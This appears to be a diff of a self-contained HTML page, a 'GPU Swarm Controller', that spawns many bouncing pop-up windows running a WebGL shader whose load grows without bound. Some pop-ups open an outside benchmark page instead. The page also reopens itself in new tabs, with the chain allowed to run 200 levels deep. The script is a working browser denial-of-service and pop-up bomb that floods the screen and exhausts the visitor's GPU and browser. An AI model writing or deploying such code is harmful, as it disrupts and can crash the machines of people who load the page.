@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>GPU Stress Launcher</title>
+    <title>GPU Swarm Controller</title>
     <style>
         body { 
             background: #111; color: #eee; 
@@ -21,23 +21,19 @@
 <body>
 
 <div class="card">
-    <h2>GPU Swarm Initiated</h2>
-    <p id="status-text">Rolling the dice to spawn the swarm...</p>
-    <p style="font-size: 0.85rem; color: #ff5555;">Note: If nothing happens, check your URL bar! You must allow pop-ups for this site and refresh the page.</p>
+    <h2>Swarm Status</h2>
+    <p id="status-text">Initializing...</p>
+    <p style="font-size: 0.85rem; color: #ff5555;">Check the URL bar to allow pop-ups if the swarm doesn't start!</p>
 </div>
 
 <script>
-    // ==========================================
-    // ⚙️ CONTROLS: CHANGE THESE NUMBERS!
-    // ==========================================
-    const TAB_CHAIN_LIMIT = 200;  // Maximum depth of the tab cloning tree to prevent crashes
-    // ==========================================
+    const TAB_CHAIN_LIMIT = 200; 
 
+    // The code for the bouncing GPU stress windows
     const stressTestCode = `
         <!DOCTYPE html>
         <html>
         <head>
-            <title>TEST</title>
             <style>
                 body { margin: 0; overflow: hidden; background: #000; color: #0f0; font-family: monospace; }
                 canvas { display: block; width: 100vw; height: 100vh; }
@@ -45,76 +41,42 @@
             </style>
         </head>
         <body>
-            <div id="stats">
-                FPS:<span id="fps">--</span> C:<span id="comp">--</span>
-            </div>
+            <div id="stats">FPS:<span id="fps">--</span> C:<span id="comp">--</span></div>
             <canvas id="c"></canvas>
             <script>
                 const canvas = document.getElementById('c');
                 const gl = canvas.getContext('webgl');
                 let complexity = 10;
                 let lastTime = 0;
-
                 const vs = "attribute vec2 p; void main(){ gl_Position=vec4(p,0,1); }";
                 const fs = "precision highp float; uniform float t; uniform vec2 r; uniform float c; void main(){ vec2 uv=(gl_FragCoord.xy-0.5*r)/r.y; vec3 col=vec3(0); vec3 ro=vec3(0,0,-3); vec3 rd=normalize(vec3(uv,1)); float d=0.0; for(float i=0.0; i<500.0; i++){ if(i>c)break; vec3 p=ro+rd*d; for(int j=0; j<8; j++){ p=abs(p)-0.5; p*=1.5; p=vec3(p.x*cos(t)-p.y*sin(t), p.x*sin(t)+p.y*cos(t), p.z); } float dist=length(p)*0.01; d+=dist; if(dist<0.001||d>20.0)break; col+=0.005*vec3(sin(d),cos(d*0.5),1.0); } gl_FragColor=vec4(col,1.0); }";
-
-                function createS(gl, type, src) {
-                    const s = gl.createShader(type);
-                    gl.shaderSource(s, src);
-                    gl.compileShader(s);
-                    return s;
-                }
-
+                function createS(gl, type, src) { const s = gl.createShader(type); gl.shaderSource(s, src); gl.compileShader(s); return s; }
                 const prog = gl.createProgram();
                 gl.attachShader(prog, createS(gl, gl.VERTEX_SHADER, vs));
                 gl.attachShader(prog, createS(gl, gl.FRAGMENT_SHADER, fs));
-                gl.linkProgram(prog);
-                gl.useProgram(prog);
-
-                const b = gl.createBuffer();
-                gl.bindBuffer(gl.ARRAY_BUFFER, b);
+                gl.linkProgram(prog); gl.useProgram(prog);
+                const b = gl.createBuffer(); gl.bindBuffer(gl.ARRAY_BUFFER, b);
                 gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1,1,-1,-1,1,-1,1,1,-1,1,1]), gl.STATIC_DRAW);
-                const pL = gl.getAttribLocation(prog, "p");
-                gl.enableVertexAttribArray(pL);
+                const pL = gl.getAttribLocation(prog, "p"); gl.enableVertexAttribArray(pL);
                 gl.vertexAttribPointer(pL, 2, gl.FLOAT, false, 0, 0);
-
-                const tL = gl.getUniformLocation(prog, "t");
-                const rL = gl.getUniformLocation(prog, "r");
-                const cL = gl.getUniformLocation(prog, "c");
-
+                const tL = gl.getUniformLocation(prog, "t"), rL = gl.getUniformLocation(prog, "r"), cL = gl.getUniformLocation(prog, "c");
                 function loop(now) {
-                    now *= 0.001;
-                    const dt = now - lastTime;
-                    lastTime = now;
-                    
+                    now *= 0.001; const dt = now - lastTime; lastTime = now;
                     document.getElementById('fps').innerText = Math.round(1/dt);
                     document.getElementById('comp').innerText = Math.floor(complexity);
-
                     complexity *= 1.01;
-
-                    canvas.width = window.innerWidth;
-                    canvas.height = window.innerHeight;
+                    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
                     gl.viewport(0,0,canvas.width, canvas.height);
-                    gl.uniform1f(tL, now);
-                    gl.uniform2f(rL, canvas.width, canvas.height);
-                    gl.uniform1f(cL, complexity);
-                    gl.drawArrays(gl.TRIANGLES, 0, 6);
-                    requestAnimationFrame(loop);
+                    gl.uniform1f(tL, now); gl.uniform2f(rL, canvas.width, canvas.height); gl.uniform1f(cL, complexity);
+                    gl.drawArrays(gl.TRIANGLES, 0, 6); requestAnimationFrame(loop);
                 }
-
                 requestAnimationFrame(loop);
-
-                let velX = (Math.random() > 0.5 ? 1 : -1) * (5 + Math.random() * 2); 
-                let velY = (Math.random() > 0.5 ? 1 : -1) * (5 + Math.random() * 2); 
-
+                let vx = (Math.random() > 0.5 ? 1 : -1) * (5 + Math.random() * 2);
+                let vy = (Math.random() > 0.5 ? 1 : -1) * (5 + Math.random() * 2);
                 setInterval(() => {
-                    if (window.screenX <= 0 || window.screenX + window.outerWidth >= screen.availWidth) {
-                        velX *= -1;
-                    }
-                    if (window.screenY <= 0 || window.screenY + window.outerHeight >= screen.availHeight) {
-                        velY *= -1;
-                    }
-                    window.moveBy(velX, velY);
+                    if (window.screenX <= 0 || window.screenX + window.outerWidth >= screen.availWidth) vx *= -1;
+                    if (window.screenY <= 0 || window.screenY + window.outerHeight >= screen.availHeight) vy *= -1;
+                    window.moveBy(vx, vy);
                 }, 16);
             <\/script>
         </body>
@@ -123,60 +85,47 @@
 
     window.onload = () => {
         const urlParams = new URLSearchParams(window.location.search);
-        
         let currentChain = urlParams.has('chain') ? parseInt(urlParams.get('chain')) : TAB_CHAIN_LIMIT;
 
         if (currentChain <= 0) {
-            document.getElementById('status-text').innerText = "Chain reaction finished! No more tabs will spawn.";
+            document.getElementById('status-text').innerText = "Chain limit reached.";
             return; 
         }
 
-        const w = 150;
-        const h = 150;
+        const w = 150, h = 150;
         let tabsSpawned = 0;
-        
-        // Randomly choose between 1 and 4 bouncing windows for this specific tab
-        const randomWindowCount = Math.floor(Math.random() * 25) + 1;
+        const randomWindowCount = Math.floor(Math.random() * 10) + 1;
 
         for (let i = 0; i < randomWindowCount; i++) {
-            // Calculate random spawn coordinates
             const maxLeft = window.screen.availWidth - w;
             const maxTop = window.screen.availHeight - h;
-            const randomLeft = Math.floor(Math.random() * maxLeft);
-            const randomTop = Math.floor(Math.random() * maxTop);
+            const left = Math.floor(Math.random() * maxLeft);
+            const top = Math.floor(Math.random() * maxTop);
+            const feat = `width=${w},height=${h},left=${left},top=${top}`;
 
-            const features = `width=${w},height=${h},left=${randomLeft},top=${randomTop}`;
-
-            // Spawn the bouncing WebGL window
-            const win = window.open("", "StressTest_Chain" + currentChain + "_Win" + i, features);
-            if (win) {
-                win.document.write(stressTestCode);
-                win.document.close();
+            // 25% chance to be a STATIC window to cznull link
+            if (Math.random() <= 0.25) {
+                window.open("https://cznull.github.io/vsbm", "StaticWin_" + currentChain + "_" + i, feat);
             } else {
-                console.warn("Pop-up blocked. Waiting for user to allow them.");
+                // 75% chance to be a MOVING stress test window
+                const win = window.open("", "StressWin_" + currentChain + "_" + i, feat);
+                if (win) {
+                    win.document.write(stressTestCode);
+                    win.document.close();
+                }
             }
 
-            // 25% chance to spawn a new tab for each bouncing window
+            // Independent 25% chance to spawn a new TAB
             if (Math.random() <= 0.25) {
                 tabsSpawned++;
-                
-                // Stagger the new tabs opening by a few milliseconds so the browser doesn't freak out
                 setTimeout(() => {
-                    let nextChain = currentChain - 1;
-                    let baseUrl = window.location.href.split('?')[0]; 
-                    let cloneUrl = baseUrl + "?chain=" + nextChain;
-                    
-                    window.open(cloneUrl, "_blank");
-                }, 200 + (tabsSpawned * 150)); 
+                    const baseUrl = window.location.href.split('?')[0]; 
+                    window.open(baseUrl + "?chain=" + (currentChain - 1), "_blank");
+                }, 200 + (tabsSpawned * 150));
             }
         }
         
-        // Update text to show what happened
-        if (tabsSpawned > 0) {
-            document.getElementById('status-text').innerText = `Spawned ${randomWindowCount} bouncing window(s) and successfully triggered ${tabsSpawned} new tab(s).`;
-        } else {
-            document.getElementById('status-text').innerText = `Spawned ${randomWindowCount} bouncing window(s), but the RNG failed to spawn any new tabs!`;
-        }
+        document.getElementById('status-text').innerText = `Spawned ${randomWindowCount} window(s). New tabs triggered: ${tabsSpawned}.`;
     };
 </script>
 
